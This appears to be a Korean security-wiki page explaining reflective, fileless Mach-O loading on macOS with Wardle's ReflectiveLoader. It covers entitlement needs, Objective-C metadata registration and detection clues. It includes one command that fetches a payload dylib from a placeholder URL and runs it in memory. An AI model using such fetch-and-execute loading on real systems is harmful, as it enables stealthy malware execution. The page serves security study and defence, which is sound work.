# macOS에서의 Reflective Mach-O 로딩

{{#include ../../../banners/hacktricks-training.md}}

Reflective loader는 자체 프로세스에 이미 있는 바이트로부터 Mach-O 이미지를 매핑한 다음, 시스템 로더에 payload 파일을 열도록 요청하지 않고 이를 링크하고 초기화 코드를 실행합니다. 이는 **프로세스 내부 코드 실행**이며, 권한 상승이나 원격 프로세스 인젝션 프리미티브가 아닙니다.<sup>[[2]](#references)</sup>

최근 macOS에서는 이전의 `NSCreateObjectFileImageFromMemory`/`NSLinkModule` 경로가 이미지를 디스크에 씁니다. ReflectiveLoader는 이전 Apple dyld 로딩 코드를 포함하며, Wardle은 macOS 15 및 26에서 이를 시연했습니다.<sup>[[2]](#references)[[3]](#references)</sup>

loader가 Hardened Runtime을 사용하는 경우, 서명되지 않은 인메모리 코드를 실행하려면 `com.apple.security.cs.allow-unsigned-executable-memory` 또는 `com.apple.security.cs.disable-executable-page-protection` 같은 실행 메모리 예외가 필요합니다. 그렇지 않으면 코드 서명 적용으로 실행이 차단됩니다. 이는 loader의 서명 제약일 뿐, 권한 상승 프리미티브가 아닙니다. [macOS entitlements reference](../macos-security-protections/macos-dangerous-entitlements.md#comapplesecuritycsallow-unsigned-executable-memory)를 참고하세요.<sup>[[2]](#references)</sup>

PoC를 실행하려면 raw Mach-O **bundle, framework 또는 dylib**를 제공하는 URL을 지정합니다. 해당 PoC의 `main.mm`은 빈 다운로드를 거부하며, `LC_DYLD_CHAINED_FIXUPS`를 사용하는 payload는 지원되지 않는다고 명시합니다. 로컬 경로도 사용할 수 있지만, 이는 fileless 워크플로가 아닙니다. URL 방식은 바이트를 `NSData`로 읽어 그 버퍼와 길이를 `custom_dlopen_from_memory`에 전달합니다.<sup>[[4]](#references)</sup>

```bash
./PoC 'https://example.invalid/payload.dylib'
```

내장 loader는 `ImageLoaderMachO::instantiateFromMemory`를 호출한 다음 `image->link`를 호출합니다. 생성자를 실행하는 `image->runInitializers`를 호출하기 전에, linking 후 Objective-C metadata를 등록합니다.<sup>[[5]](#references)</sup> 등록하지 않으면 Objective-C 메시지를 보내는 생성자에서 `unrecognized selector sent to instance` 오류가 발생할 수 있습니다.<sup>[[3]](#references)</sup> [dyld의 일반적인 image-loading 흐름](macos-library-injection/macos-dyld-process.md#flow)과 [Mach-O 섹션 참조](../macos-files-folders-and-binaries/universal-binaries-and-mach-o-format.md#objective-c-common-sections)를 참조하세요.

## Activating Objective-C metadata

일반적인 dyld 로딩과 달리, 이전 image loader를 내장해도 payload의 Objective-C metadata를 `libobjc`에서 자동으로 사용할 수 있게 되지는 않습니다.<sup>[[3]](#references)</sup> 적용된 LLVM JIT 방식은 매핑된 `__DATA` 및 `__DATA_CONST` Objective-C 섹션을 검색한 다음, 생성자가 실행되기 전에 다음 단계를 수행합니다.<sup>[[1]](#references)[[5]](#references)[[6]](#references)</sup>

1. `sizeof(SEL)` 단위로 `__objc_selrefs`를 순회합니다. 각 non-null selector의 이름을 `sel_getName`으로 가져와 `sel_registerName`에 전달한 다음, 섹션의 포인터를 canonical `SEL`로 교체합니다.
2. `__objc_classlist`에서 클래스를 수집하고 `objc_readClassPair`로 등록합니다. 이때 superclass 의존성을 먼저 해결합니다.
3. `__objc_classrefs` 및 `__objc_superrefs`의 참조를 등록된 클래스 또는 metaclass로 다시 작성하고, `__objc_catlist`에서 category 메서드를 연결합니다.

예를 들어, `ObjCRuntime.cpp`의 selector 복구 코드는 다음과 동일합니다.<sup>[[6]](#references)</sup>

```objectivec
for (uint8_t *cursor = sectionStart;
     cursor < sectionStart + selRefsSectionSize;
     cursor += sizeof(SEL)) {
    SEL *selector = (SEL *)cursor;
    if (*selector == NULL) continue;
    *selector = sel_registerName(sel_getName(*selector));
}
```

PoC는 내부 Objective-C runtime 동작에 의존하며 모든 Mach-O 형식 기능을 지원하지 않으므로, 등록 코드는 범용으로 바로 사용할 수 있는 loader라기보다 구현 참고 자료입니다.<sup>[[1]](#references)[[4]](#references)[[6]](#references)</sup> payload에서 정의한 클래스뿐 아니라 참조되는 Apple 클래스와 메서드도 등록해야 합니다.<sup>[[3]](#references)</sup>

reflective 방식으로 로드된 이미지는 저자의 테스트에서 `dyld_all_image_infos`에 나타나지 않습니다. 대신 이름 없는 실행 가능 매핑이 `vmmap`에서 이름 없는 `dylib` 영역으로 표시될 수 있으며, 샘플링된 프레임은 `<unknown binary>`로 표시될 수 있습니다. 이는 검사 단서일 뿐, 해당 loader에 대한 신뢰할 수 있는 귀속 근거는 아니며, 다른 프로세스의 task 정보에 접근하려면 entitlement가 필요합니다. 프로세스 접근 제한은 [macOS memory dumping](../macos-files-folders-and-binaries/macos-memory-dumping.md)을 참조하세요.<sup>[[3]](#references)</sup>

## References

- [1] [macOS에서의 LLVM JIT, Objective-C 및 Swift: 지식 정리](https://stanislaw.github.io/2018-09-03-llvm-jit-objc-and-swift-knowledge-dump.html)
- [2] [macOS에서 Reflective Code Loading 복원하기 (1부)](https://objective-see.org/blog/blog_0x7C.html)
- [3] [macOS에서 Reflective Code Loading 복원하기 (2부)](https://objective-see.org/blog/blog_0x82.html)
- [4] [ReflectiveLoader PoC main.mm](https://github.com/pwardle/ReflectiveLoader/blob/main/PoC/PoC/main.mm)
- [5] [ReflectiveLoader custom_dlfcn.cpp](https://github.com/pwardle/ReflectiveLoader/blob/main/loader/src/custom_dlfcn.cpp)
- [6] [ReflectiveLoader ObjCRuntime.cpp](https://github.com/pwardle/ReflectiveLoader/blob/main/loader/src/ObjCRuntime.cpp)
